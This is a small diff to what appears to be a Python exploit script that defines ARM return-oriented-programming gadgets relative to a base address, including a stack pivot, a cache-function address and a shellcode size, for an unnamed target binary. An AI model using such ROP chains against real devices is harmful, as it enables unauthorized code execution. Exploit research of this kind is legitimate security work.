@@ -13,7 +13,7 @@ pop_pc = base + 0x3bce0
 #  1d98:       4798            blx     r3 ; pop     {r3, pc}
 blx_r3_pop_r3 = base + 0x1d98|1
 
-cache_func = 0x81E3BCD0
+cache_func = base + 0x3BCD0
 
 test = base + 0x08B0|1 # prints "Error, the pointer of pidme_data is NULL."
 
@@ -25,8 +25,6 @@ shellcode_sz = 0x200 # TODO: check size
 
 # 40f18:       4913e79d        ldmdbmi r3, {r0, r2, r3, r4, r7, r8, r9, sl, sp, lr, pc}
 pivot = base + 0x40f18;
-
-invalid = base + 0x50f2c
 
 def main():
     with open(sys.argv[1], "rb") as fin:
